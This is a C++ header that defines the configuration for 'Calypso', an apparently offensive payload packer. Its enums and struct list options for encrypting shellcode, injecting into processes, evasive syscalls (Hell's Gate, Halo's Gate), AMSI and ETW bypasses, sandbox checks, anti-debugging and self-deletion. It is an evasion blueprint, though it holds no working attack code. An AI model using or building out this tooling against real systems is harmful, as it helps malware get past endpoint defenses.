#pragma once
// Calypso - PackerConfig: all options for packing a payload

#include <string>
#include <vector>
#include <cstdint>

namespace calypso {

enum class PayloadType { Auto, Shellcode, PE, CSharp };
enum class CipherMode { AES_ECB, AES_CBC, XOR, RC4 };
enum class CryptoBackend { CNG, TinyAES };
enum class EncodingMethod { None, Base64, Hex, MAC, UUID };
enum class CompressionMethod { None, Zlib, LZ4, RLE, LZNT };
enum class InjectionMethod { Local, Remote };
enum class ExecutionPrimitive { Direct, Thread, APC, Callback, Fiber, VM, RiscVM };
enum class SyscallMethod { Indirect, HellsGate, HalosGate };
enum class OutputFormat { EXE, DLL };

enum class AmsiBypass : uint32_t {
    None            = 0,
    HWBP            = 1 << 0,
    ProviderDeregister = 1 << 1,
    ContextCorrupt  = 1 << 2,
    NtCreateSectionHook = 1 << 3,
    CLRPatch        = 1 << 4,
    Patch           = 1 << 5,
};

enum class EtwBypass : uint32_t {
    None            = 0,
    HWBP            = 1 << 0,
    ProviderDisable = 1 << 1,
    ComPlus         = 1 << 2,
    UnhookNtdll     = 1 << 3,
    PatchEtwWrite   = 1 << 4,
    PatchNtTrace    = 1 << 5,
    CallbackRemove  = 1 << 6,
};

inline AmsiBypass operator|(AmsiBypass a, AmsiBypass b) {
    return static_cast<AmsiBypass>(static_cast<uint32_t>(a) | static_cast<uint32_t>(b));
}
inline AmsiBypass operator&(AmsiBypass a, AmsiBypass b) {
    return static_cast<AmsiBypass>(static_cast<uint32_t>(a) & static_cast<uint32_t>(b));
}
inline AmsiBypass& operator|=(AmsiBypass& a, AmsiBypass b) { a = a | b; return a; }
inline bool has_flag(AmsiBypass set, AmsiBypass flag) {
    return (static_cast<uint32_t>(set) & static_cast<uint32_t>(flag)) != 0;
}

inline EtwBypass operator|(EtwBypass a, EtwBypass b) {
    return static_cast<EtwBypass>(static_cast<uint32_t>(a) | static_cast<uint32_t>(b));
}
inline EtwBypass operator&(EtwBypass a, EtwBypass b) {
    return static_cast<EtwBypass>(static_cast<uint32_t>(a) & static_cast<uint32_t>(b));
}
inline EtwBypass& operator|=(EtwBypass& a, EtwBypass b) { a = a | b; return a; }
inline bool has_flag(EtwBypass set, EtwBypass flag) {
    return (static_cast<uint32_t>(set) & static_cast<uint32_t>(flag)) != 0;
}

struct SandboxChecks {
    bool domain    = false;
    bool diskspace = false;
    bool memory    = false;
    bool emulated  = false;

    bool any() const { return domain || diskspace || memory || emulated; }
};

struct PackerConfig {
    // Input
    std::string input_file;
    PayloadType payload_type       = PayloadType::Auto;
    bool pe_to_shellcode           = false;
    std::string arguments;

    // Encryption
    std::string key;
    CipherMode cipher              = CipherMode::AES_ECB;
    CryptoBackend crypto_backend   = CryptoBackend::CNG;

    // Encoding
    EncodingMethod encoding        = EncodingMethod::None;

    // Compression
    CompressionMethod compression  = CompressionMethod::None;

    // Obfuscation
    bool obfuscate                 = false;
    bool llvm_obfuscate            = false;
    std::string ollvm_plugin;
    uint32_t obf_seed              = 0;

    // Injection
    InjectionMethod injection      = InjectionMethod::Local;
    ExecutionPrimitive exec_prim   = ExecutionPrimitive::Direct;
    std::string target_process     = "RuntimeBroker.exe";
    std::string ppid_process;
    bool block_dlls                = false;
    bool module_stomp              = false;
    bool drip_load                 = false;

    // Syscalls
    SyscallMethod syscall_method   = SyscallMethod::Indirect;

    // Evasion
    uint32_t sleep_seconds         = 0;
    AmsiBypass amsi_bypass         = AmsiBypass::HWBP;
    EtwBypass etw_bypass           = EtwBypass::HWBP;
    bool anti_debug                = true;
    SandboxChecks sandbox;
    bool self_delete               = false;
    bool iat_camouflage            = false;
    std::vector<std::string> unhook_dlls;

    // Output
    std::string output_file;
    OutputFormat output_format     = OutputFormat::EXE;
    std::vector<std::string> dll_exports;
    bool hide_window               = false;
    bool source_only               = false;
    bool verbose                   = false;
    bool entropy_reduce            = false;
};

} // namespace calypso
